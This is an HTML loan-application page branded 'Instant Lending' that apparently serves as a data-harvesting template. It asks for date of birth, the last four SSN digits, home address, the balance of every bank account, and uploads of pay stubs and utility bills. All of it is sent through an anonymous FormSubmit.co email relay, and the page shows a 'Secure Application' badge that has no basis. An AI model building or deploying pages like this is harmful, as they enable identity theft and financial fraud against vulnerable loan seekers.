<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Lending - Personal Loan Application</title>
    <!-- Tailwind CSS for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 text-slate-800 font-sans">

    <!-- Header / Navbar -->
    <header class="bg-blue-700 text-white shadow-md">
        <div class="max-w-3xl mx-auto px-6 py-4 flex justify-between items-center">
            <h1 class="text-2xl font-bold tracking-wide">Instant Lending</h1>
            <span class="text-sm bg-blue-600 px-3 py-1 rounded-full">Secure Application</span>
        </div>
    </header>

    <!-- Main Container -->
    <main class="max-w-3xl mx-auto px-6 py-10">
        <div class="bg-white shadow-xl rounded-2xl p-8 border border-slate-100">
            
            <div class="mb-8 border-b pb-4">
                <h2 class="text-2xl font-semibold text-slate-900">Personal Loan Application</h2>
                <p class="text-sm text-slate-500 mt-1">Please fill out the details and upload documents below to check your eligibility.</p>
            </div>

            <!-- Form pointing directly to your FormSubmit link -->
            <form id="loanForm" 
                  action="https://formsubmit.co/el/vejabu" 
                  method="POST" 
                  enctype="multipart/form-data" 
                  class="space-y-6">

                <!-- FormSubmit Configuration Settings -->
                <input type="hidden" name="_subject" value="New Instant Lending Loan Application!">
                <input type="hidden" name="_captcha" value="true">
                
                <!-- This tells FormSubmit to show a clean built-in confirmation message or you can replace it with a URL to a thank you page -->
                <!-- If you want a custom thank you page url instead, change value to your web page address -->
                <!-- <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html"> -->

                <!-- Step 1: Loan Amount Requested -->
                <div>
                    <label for="loanAmount" class="block text-sm font-medium text-slate-700 mb-1">How much would you like to borrow?</label>
                    <div class="relative rounded-md shadow-sm">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">$</div>
                        <input type="number" id="loanAmount" name="loanAmount" required placeholder="5,000" class="pl-8 w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                    </div>
                </div>

                <!-- Step 2: Checking or Savings Account Question -->
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-2">Do you have a checking or savings account?</label>
                    <div class="flex gap-4">
                        <label class="flex items-center space-x-2 cursor-pointer border px-4 py-2 rounded-lg hover:bg-slate-50 flex-1">
                            <input type="radio" name="hasAccount" value="Yes" onclick="toggleAccountSection(true)" required class="text-blue-600 focus:ring-blue-500">
                            <span class="font-medium text-slate-700">Yes</span>
                        </label>
                        <label class="flex items-center space-x-2 cursor-pointer border px-4 py-2 rounded-lg hover:bg-slate-50 flex-1">
                            <input type="radio" name="hasAccount" value="No" onclick="toggleAccountSection(false)" required class="text-blue-600 focus:ring-blue-500">
                            <span class="font-medium text-slate-700">No</span>
                        </label>
                    </div>
                </div>

                <!-- Dynamic Account Section (Hidden by default) -->
                <div id="accountDetailsSection" class="hidden space-y-4 bg-slate-50 p-6 rounded-xl border border-slate-200">
                    <div>
                        <label for="accountCount" class="block text-sm font-medium text-slate-700 mb-1">How many checking/savings accounts do you have?</label>
                        <input type="number" id="accountCount" name="accountCount" min="1" max="10" placeholder="1" oninput="generateAccountInputs()" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none bg-white">
                    </div>

                    <!-- Container where individual placeholders will be injected -->
                    <div id="dynamicAccountInputs" class="space-y-3"></div>
                </div>

                <!-- Step 3: Basic Personal Information -->
                <div class="border-t pt-6 space-y-4">
                    <h3 class="text-lg font-medium text-slate-900">Your Personal Information</h3>
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label for="firstName" class="block text-sm font-medium text-slate-700 mb-1">First Name</label>
                            <input type="text" id="firstName" name="firstName" required placeholder="John" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                        </div>
                        <div>
                            <label for="lastName" class="block text-sm font-medium text-slate-700 mb-1">Last Name</label>
                            <input type="text" id="lastName" name="lastName" required placeholder="Doe" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                        </div>
                    </div>

                    <!-- Date of Birth & Phone Number -->
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label for="dob" class="block text-sm font-medium text-slate-700 mb-1">Date of Birth</label>
                            <input type="date" id="dob" name="dateOfBirth" required class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none bg-white">
                        </div>
                        <div>
                            <label for="phone" class="block text-sm font-medium text-slate-700 mb-1">Phone Number</label>
                            <input type="tel" id="phone" name="phoneNumber" required placeholder="(555) 000-0000" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                        </div>
                    </div>

                    <!-- Email Address & Last 4 SSN -->
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label for="email" class="block text-sm font-medium text-slate-700 mb-1">Email Address</label>
                            <input type="email" id="email" name="email" required placeholder="john.doe@example.com" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                        </div>
                        <div>
                            <label for="ssn" class="block text-sm font-medium text-slate-700 mb-1">Last 4 Digits of SSN</label>
                            <input type="password" id="ssn" name="last4SSN" maxlength="4" pattern="\d{4}" required placeholder="••••" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none tracking-widest text-center font-mono">
                        </div>
                    </div>

                    <!-- Residential Address -->
                    <div>
                        <label for="address" class="block text-sm font-medium text-slate-700 mb-1">Street Address</label>
                        <input type="text" id="address" name="streetAddress" required placeholder="123 Main St, Apt 4B" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none mb-3">
                        
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
                            <input type="text" id="city" name="city" required placeholder="City" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                            <input type="text" id="state" name="state" required placeholder="State" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                            <input type="text" id="zip" name="zipCode" required placeholder="Zip Code" class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none">
                        </div>
                    </div>

                    <!-- Employment Status -->
                    <div>
                        <label for="employmentStatus" class="block text-sm font-medium text-slate-700 mb-1">Employment Status</label>
                        <select id="employmentStatus" name="employmentStatus" required class="w-full p-3 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none bg-white">
                            <option value="">Select employment status</option>
                            <option value="Full-Time">Full-Time</option>
                            <option value="Part-Time">Part-Time</option>
                            <option value="Self-Employed">Self-Employed</option>
                            <option value="Retired">Retired</option>
                            <option value="Other">Other</option>
                        </select>
                    </div>
                </div>

                <!-- Step 4: Real Document Uploads -->
                <div class="border-t pt-6 space-y-4">
                    <h3 class="text-lg font-medium text-slate-900">Document Verification</h3>
                    <p class="text-xs text-slate-500">Please upload clear pictures or PDF scans for verification.</p>

                    <!-- Income Verification Upload -->
                    <div>
                        <label for="incomeVerification" class="block text-sm font-medium text-slate-700 mb-1">Proof of Income (Paystub / Tax Document)</label>
                        <input type="file" id="incomeVerification" name="incomeVerificationFile" accept="image/png, image/jpeg, application/pdf" required class="w-full p-2.5 border border-slate-300 rounded-lg bg-slate-50 text-sm text-slate-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
                    </div>

                    <!-- Proof of Address Upload -->
                    <div>
                        <label for="proofOfAddress" class="block text-sm font-medium text-slate-700 mb-1">Proof of Address (Utility Bill / Lease Agreement)</label>
                        <input type="file" id="proofOfAddress" name="proofOfAddressFile" accept="image/png, image/jpeg, application/pdf" required class="w-full p-2.5 border border-slate-300 rounded-lg bg-slate-50 text-sm text-slate-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
                    </div>
                </div>

                <!-- Submit Button -->
                <div class="pt-4">
                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3.5 rounded-lg transition duration-200 shadow-md">
                        Submit Application to Instant Lending
                    </button>
                </div>

            </form>

        </div>
    </main>

    <!-- JavaScript functionality -->
    <script>
        function toggleAccountSection(hasAccount) {
            const section = document.getElementById('accountDetailsSection');
            const accountCountInput = document.getElementById('accountCount');
            
            if (hasAccount) {
                section.classList.remove('hidden');
                accountCountInput.required = true;
            } else {
                section.classList.add('hidden');
                accountCountInput.required = false;
                accountCountInput.value = '';
                document.getElementById('dynamicAccountInputs').innerHTML = '';
            }
        }

        function generateAccountInputs() {
            const count = parseInt(document.getElementById('accountCount').value);
            const container = document.getElementById('dynamicAccountInputs');
            container.innerHTML = '';

            if (isNaN(count) || count <= 0) return;

            for (let i = 1; i <= count; i++) {
                const div = document.createElement('div');
                div.innerHTML = `
                    <label class="block text-xs font-semibold text-slate-600 uppercase mb-1">Balance in Account #${i}</label>
                    <div class="relative rounded-md shadow-sm">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">$</div>
                        <input type="number" name="accountBalance_${i}" required placeholder="0.00" class="pl-8 w-full p-2.5 border border-slate-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:outline-none bg-white">
                    </div>
                `;
                container.appendChild(div);
            }
        }
    </script>
</body>
</html>
